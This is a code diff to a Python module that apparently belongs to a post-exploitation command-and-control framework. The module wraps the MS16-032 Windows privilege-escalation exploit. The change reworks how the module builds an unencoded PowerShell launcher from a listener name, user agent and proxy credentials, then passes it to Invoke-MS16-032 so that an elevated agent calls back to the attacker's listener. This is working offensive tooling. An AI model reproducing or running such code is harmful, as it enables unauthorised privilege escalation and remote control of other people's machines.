@@ -28,19 +28,16 @@ class Module(object):
         script = module_code
 
         # generate the launcher code without base64 encoding
-        launcher = main_menu.stagers.stagers['multi/launcher']
-        launcher.options['Listener'] = params['Listener']
-        launcher.options['UserAgent'] = params['UserAgent']
-        launcher.options['Proxy'] = params['Proxy']
-        launcher.options['ProxyCreds'] = params['ProxyCreds']
-        launcher.options['SafeChecks'] = 'False'
-        launcher.options['ScriptLogBypass'] = 'False'
-        launcher.options['AMSIBypass'] = 'False'
-        launcher.options['Base64'] = 'False'
-        launcher_code = launcher.generate()
+        listener_name = params['Listener']
+        user_agent = params['UserAgent']
+        proxy = params['Proxy']
+        proxy_creds = params['ProxyCreds']
 
+        # generate the PowerShell one-liner with all of the proper options set
+        launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=False,
+                                                       userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds)
         # need to escape characters
-        launcher_code = launcher_code.replace("`", "``").replace("$", "`$").replace("\"", "'")
+        launcher_code = launcher.replace("`", "``").replace("$", "`$").replace("\"", "'")
 
         script_end = 'Invoke-MS16-032 "' + launcher_code + '"'
         script_end += ';"`nInvoke-MS16032 completed."'
